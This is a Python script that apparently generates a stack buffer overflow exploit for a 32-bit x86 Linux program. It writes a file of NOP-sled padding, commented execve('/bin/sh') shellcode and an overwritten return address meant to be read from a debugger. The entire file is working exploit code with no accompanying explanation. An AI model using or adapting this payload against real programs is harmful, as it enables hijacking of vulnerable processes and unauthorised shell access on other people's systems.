import sys
import struct

# Target buffer address (adjust based on your program and debugging with GDB)
buffer_address = 0xffffcde8  # Replace with actual buffer address obtained via GDB

# Shellcode: Example for spawning a shell (x86 Linux)
# This is a small shellcode that executes /bin/sh
shellcode = (
    b"\x31\xc0"              # xor eax, eax
    b"\x50"                  # push eax
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"              # mov ebx, esp
    b"\x50"                  # push eax
    b"\x53"                  # push ebx
    b"\x89\xe1"              # mov ecx, esp
    b"\xb0\x0b"              # mov al, 11
    b"\xcd\x80"              # int 0x80
)

# Buffer size (32 bytes)
buffer_size = 32

# Ensure the shellcode size fits within the buffer
shellcode_size = len(shellcode)
if shellcode_size >= buffer_size:
    print("Shellcode is too large for the buffer size. Optimize the shellcode.")
    sys.exit(1)

# Calculate padding (NOP sled size)
nop_sled_size = buffer_size - shellcode_size
nop_sled = b"\x90" * nop_sled_size  # NOP sled

# Pack the buffer address in little-endian format
return_address = struct.pack("<I", buffer_address)

# Construct the payload: [NOP sled] + [shellcode] + [return address]
payload = nop_sled + shellcode + return_address

# Write the payload to a binary file
output_file = "exploit.bin"
with open(output_file, "wb") as f:
    f.write(payload)

print(f"[+] Exploit payload written to {output_file}")
print(f"    Buffer Address: {hex(buffer_address)}")
print(f"    Payload Size: {len(payload)} bytes")
